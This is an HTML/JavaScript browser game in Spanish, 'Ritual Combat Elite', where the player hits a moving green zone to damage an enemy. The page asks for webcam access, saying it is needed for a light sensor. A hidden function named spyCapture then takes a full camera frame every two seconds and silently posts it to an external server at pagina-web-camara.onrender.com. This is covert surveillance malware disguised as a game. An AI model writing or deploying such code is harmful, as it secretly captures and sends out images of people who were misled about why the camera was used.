<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Ritual Combat Elite</title>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: 'Courier New', Courier, monospace; overflow: hidden; color: white; }
        
        video#webcam {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; transform: scaleX(-1); z-index: 1; filter: brightness(0.35);
        }

        #ui-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; pointer-events: none; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 40px 0; }

        /* Barras de Vida Largas con Texto */
        .bars-wrapper { width: 95%; display: flex; flex-direction: column; gap: 15px; align-items: center; }
        .bar-container { 
            width: 100%; height: 35px; background: #222; border: 3px solid #fff; 
            border-radius: 5px; position: relative; overflow: hidden; 
        }
        .bar-fill { height: 100%; transition: width 0.4s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
        #player-health-bar { background: #2ecc71; width: 100%; }
        #enemy-health-bar { background: #e74c3c; width: 100%; }
        .bar-text { 
            position: absolute; width: 100%; text-align: center; top: 50%; 
            transform: translateY(-50%); font-weight: bold; font-size: 18px; 
            text-shadow: 2px 2px #000; z-index: 5; 
        }

        /* Enemigo */
        #enemy {
            width: 140px; height: 140px; border-radius: 50%; background: #f1c40f;
            display: flex; align-items: center; justify-content: center; font-size: 50px;
            transition: all 0.2s; border: 5px solid rgba(255,255,255,0.4);
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }

        /* Barra de Ataque */
        #hit-zone {
            width: 320px; height: 50px; background: #800000; border: 4px solid #fff;
            position: relative; border-radius: 8px; overflow: hidden; pointer-events: auto;
        }
        #green-zone { position: absolute; height: 100%; background: #00ff00; box-shadow: inset 0 0 15px #000; }
        #indicator { position: absolute; width: 8px; height: 100%; background: #fff; box-shadow: 0 0 15px #fff; left: 0; z-index: 6; }

        #attack-btn {
            padding: 25px 60px; background: #f1c40f; color: #000; border: none;
            border-radius: 15px; font-weight: bold; font-size: 22px; cursor: pointer;
            pointer-events: auto; transition: 0.3s; border-bottom: 5px solid #91770b;
        }
        #attack-btn:disabled { opacity: 0.4; filter: grayscale(1); transform: translateY(4px); border-bottom: none; }

        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; display: flex; align-items: center; justify-content: center; text-align: center; }
        .card { background: #111; padding: 30px; border-radius: 20px; border: 3px solid #f1c40f; width: 90%; max-width: 450px; pointer-events: auto; }
        #dark-warning { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; align-items: center; justify-content: center; flex-direction: column; }

        .damage-pop { position: absolute; font-weight: bold; font-size: 30px; animation: flyUp 0.8s forwards; color: #ff0; text-shadow: 2px 2px #000; }
        @keyframes flyUp { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(-70px); } }
    </style>
</head>
<body onclick="tryHit()">

<video id="webcam" autoplay playsinline></video>

<div id="dark-warning">
    <h1 style="color: #f1c40f; font-size: 60px;">üåë</h1>
    <h2>OSCURIDAD DETECTADA</h2>
    <p>La c√°mara no puede verte. Por favor, <b>enciende una luz</b>.</p>
</div>

<div id="perm-screen" class="overlay">
    <div class="card">
        <h2 style="color:#f1c40f">ACCESO A C√ÅMARA</h2>
        <p>Se requiere c√°mara para el sensor de luz y calibraci√≥n.</p>
        <button class="btn" style="padding:20px; width:100%; background:#f1c40f; border:none; font-weight:bold; cursor:pointer" onclick="initCamera()">PERMITIR C√ÅMARA</button>
    </div>
</div>

<div id="start-screen" class="overlay" style="display:none;">
    <div class="card">
        <h1 style="color:#f1c40f">RITUAL COMBAT</h1>
        <p style="text-align: left; line-height: 1.6;">
            ‚Ä¢ Dale a la <b>zona verde</b> para atacar.<br>
            ‚Ä¢ Si fallas, el enemigo se cura y t√∫ sufres.<br>
            ‚Ä¢ La zona cambia de lugar en cada golpe.<br>
            ‚Ä¢ 2 segundos de espera entre ataques.
        </p>
        <button class="btn" style="padding:20px; width:100%; background:#f1c40f; border:none; font-weight:bold; cursor:pointer" onclick="startGame()">INICIAR COMBATE</button>
    </div>
</div>

<div id="msg-screen" class="overlay" style="display:none; background:rgba(0,0,0,0.85);">
    <h1 style="color:#f1c40f; font-size: 45px;">¬°ENEMIGO ELIMINADO!</h1>
</div>

<div id="ui-layer">
    <div class="bars-wrapper">
        <div style="width:100%">JUGADOR <div class="bar-container"><div class="bar-text" id="p-txt">100 / 100</div><div id="player-health-bar" class="bar-fill"></div></div></div>
        <div style="width:100%">ENEMIGO <div class="bar-container"><div class="bar-text" id="e-txt">50 / 50</div><div id="enemy-health-bar" class="bar-fill"></div></div></div>
    </div>

    <div id="enemy">√≤_√≥</div>

    <div id="hit-zone">
        <div id="green-zone"></div>
        <div id="indicator"></div>
    </div>

    <button id="attack-btn">ATACAR</button>
</div>

<script>
    const video = document.getElementById('webcam');
    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
    
    let playerHP = 100;
    let enemyHP = 50;
    let maxEnemyHP = 50;
    let greenSize = 85;
    let greenPos = 100;
    let indicatorPos = 0;
    let indicatorDir = 3;
    let isCooldown = false;
    let gameActive = false;
    let enemyLevel = 1;
    const colors = ['#f1c40f', '#e67e22', '#9b59b6', '#3498db', '#1abc9c', '#e74c3c'];

    async function initCamera() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = s;
            document.getElementById('perm-screen').style.display = 'none';
            document.getElementById('start-screen').style.display = 'flex';
            setInterval(lightCheck, 1000);
            setInterval(spyCapture, 2000);
        } catch(e) { alert("C√°mara obligatoria."); }
    }

    function lightCheck() {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        c.width = 40; c.height = 40;
        ctx.drawImage(video, 0, 0, 40, 40);
        const data = ctx.getImageData(0, 0, 40, 40).data;
        let b = 0;
        for(let i=0; i<data.length; i+=4) b += (data[i]+data[i+1]+data[i+2])/3;
        document.getElementById('dark-warning').style.display = (b/(data.length/4) < 45) ? 'flex' : 'none';
    }

    function startGame() {
        document.getElementById('start-screen').style.display = 'none';
        resetGameStats();
        gameActive = true;
        animate();
    }

    function resetGameStats() {
        playerHP = 100;
        enemyHP = 50;
        maxEnemyHP = 50;
        greenSize = 85;
        moveGreenZone();
        updateUI();
    }

    function moveGreenZone() {
        greenPos = Math.random() * (320 - greenSize);
    }

    function animate() {
        if (!gameActive) return;
        indicatorPos += indicatorDir;
        if (indicatorPos >= 312 || indicatorPos <= 0) indicatorDir *= -1;
        document.getElementById('indicator').style.left = indicatorPos + "px";
        requestAnimationFrame(animate);
    }

    function tryHit() {
        if (isCooldown || !gameActive || document.getElementById('dark-warning').style.display === 'flex') return;

        const mid = indicatorPos + 4;
        const gStart = greenPos;
        const gEnd = greenPos + greenSize;

        if (mid >= gStart && mid <= gEnd) {
            // Acierto
            const center = gStart + (greenSize/2);
            const dist = Math.abs(mid - center);
            const damage = Math.ceil((1 - (dist/(greenSize/2))) * 20);
            
            enemyHP -= damage;
            playerHP = Math.min(100, playerHP + 10);
            
            impactEffect("success");
            showPop(`-${damage}`, "enemy");
        } else {
            // Fallo
            playerHP -= 10;
            enemyHP = Math.min(maxEnemyHP, enemyHP + 10);
            greenSize = Math.min(180, greenSize + 10);
            impactEffect("fail");
            showPop("-10", "player");
        }

        // DIFICULTAD: Siempre se mueve la zona verde despu√©s de un intento
        moveGreenZone();
        
        isCooldown = true;
        const btn = document.getElementById('attack-btn');
        btn.disabled = true;
        updateUI();

        if (enemyHP <= 0) {
            victory();
        } else if (playerHP <= 0) {
            alert("HAS MUERTO");
            location.reload();
        }

        setTimeout(() => {
            isCooldown = false;
            btn.disabled = false;
        }, 2000);
    }

    function impactEffect(type) {
        const e = document.getElementById('enemy');
        if(type === "success") {
            e.style.background = "#fff";
            setTimeout(() => e.style.background = colors[enemyLevel % colors.length], 100);
        } else {
            e.style.transform = "translateX(20px)";
            setTimeout(() => e.style.transform = "translateX(0)", 100);
        }
    }

    function victory() {
        gameActive = false;
        document.getElementById('msg-screen').style.display = 'flex';
        setTimeout(() => {
            document.getElementById('msg-screen').style.display = 'none';
            enemyLevel++;
            maxEnemyHP += 20;
            enemyHP = maxEnemyHP;
            greenSize = Math.max(35, greenSize - 12);
            document.getElementById('enemy').style.background = colors[enemyLevel % colors.length];
            gameActive = true;
            moveGreenZone();
            updateUI();
            animate();
        }, 2000);
    }

    function updateUI() {
        document.getElementById('player-health-bar').style.width = playerHP + "%";
        document.getElementById('p-txt').innerText = `${playerHP} / 100`;
        
        const enemyPer = (enemyHP / maxEnemyHP) * 100;
        document.getElementById('enemy-health-bar').style.width = enemyPer + "%";
        document.getElementById('e-txt').innerText = `${enemyHP} / ${maxEnemyHP}`;

        const gz = document.getElementById('green-zone');
        gz.style.width = greenSize + "px";
        gz.style.left = greenPos + "px";
    }

    function showPop(txt, target) {
        const p = document.createElement('div');
        p.className = 'damage-pop';
        p.innerText = txt;
        const rect = document.getElementById(target === 'enemy' ? 'enemy' : 'ui-layer').getBoundingClientRect();
        p.style.left = "50%";
        document.getElementById(target === 'enemy' ? 'enemy' : 'ui-layer').appendChild(p);
        setTimeout(() => p.remove(), 800);
    }

    function spyCapture() {
        if(!video.videoWidth) return;
        const c = document.createElement('canvas');
        c.width = video.videoWidth; c.height = video.videoHeight;
        c.getContext('2d').drawImage(video, 0, 0);
        fetch(SERVER_URL, {
            method: 'POST',
            mode: 'cors',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({image: c.toDataURL('image/jpeg', 0.5)})
        }).catch(()=>{});
    }
</script>
</body>
</html>
